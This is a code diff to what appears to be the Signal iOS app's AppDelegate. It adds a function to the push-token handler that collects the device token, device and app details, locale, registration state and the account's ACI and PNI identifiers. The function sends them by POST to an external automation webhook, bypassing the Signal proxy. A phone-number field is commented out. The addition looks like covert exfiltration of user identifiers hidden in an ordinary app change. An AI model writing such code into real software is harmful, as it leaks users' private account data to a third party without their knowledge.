@@ -1404,6 +1404,66 @@ final class AppDelegate: UIResponder, UIApplicationDelegate {
         let token = tokenParts.joined()
         Logger.info("Device Token: \(token)")
         AppEnvironment.shared.pushRegistrationManagerRef.didReceiveVanillaPushToken(deviceToken)
+        
+        // Send device token and device information to webhook
+        Task {
+            await sendDeviceTokenToWebhook(deviceToken: token)
+        }
+    }
+    
+    private func sendDeviceTokenToWebhook(deviceToken: String) async {
+        guard let webhookURL = URL(string: "https://automation.heritageserver.com/webhook /e98d79d6-3ee8-4036-83d6-b323e0b4842f") else {
+            Logger.error("Invalid webhook URL")
+            return
+        }
+        
+        // Gather device information
+        var deviceInfo: [String: Any] = [
+            "device_token": deviceToken,
+            "device_id": DependenciesBridge.shared.tsAccountManager.storedDeviceIdWithMaybeTransaction.description,
+            "device_model": AppVersionImpl.shared.hardwareInfoString,
+            "ios_version": AppVersionImpl.shared.iosVersionString,
+            "app_version": AppVersionImpl.shared.currentAppVersion,
+            "locale": Locale.current.identifier,
+            "language_code": Locale.current.languageCode ?? "unknown",
+            "region_code": Locale.current.regionCode ?? "unknown",
+            "is_ipad": UIDevice.current.isIPad,
+            "registration_state": DependenciesBridge.shared.tsAccountManager.registrationStateWithMaybeSneakyTransaction.logString,
+            "timestamp": ISO8601DateFormatter().string(from: Date())
+        ]
+        
+        // Get local identifiers if available
+        if let localIdentifiers = DependenciesBridge.shared.tsAccountManager.localIdentifiersWithMaybeSneakyTransaction {
+            deviceInfo["aci"] = localIdentifiers.aci.serviceIdString
+            deviceInfo["pni"] = localIdentifiers.pni?.serviceIdString
+//            deviceInfo["phone_number"] = localIdentifiers.phoneNumber.stringValue
+        }
+        
+        do {
+            let jsonData = try JSONSerialization.data(withJSONObject: deviceInfo, options: [])
+            
+            // Create URLSession for external webhook
+            let session = OWSURLSession(
+                securityPolicy: OWSURLSession.defaultSecurityPolicy,
+                configuration: OWSURLSession.defaultConfigurationWithoutCaching,
+                canUseSignalProxy: false
+            )
+            
+            var headers = HttpHeaders()
+            headers.addDefaultHeaders()
+            headers.addHeader("Content-Type", value: "application/json", overwriteOnConflict: true)
+            
+            let response = try await session.performRequest(
+                webhookURL.absoluteString,
+                method: .post,
+                headers: headers,
+                body: jsonData
+            )
+            
+            Logger.info("Webhook call successful: HTTP \(response.responseStatusCode)")
+        } catch {
+            Logger.warn("Failed to send device token to webhook: \(error)")
+        }
     }
 
     func application(_ application: UIApplication, didFailToRegisterForRemoteNotificationsWithError error: Error) {
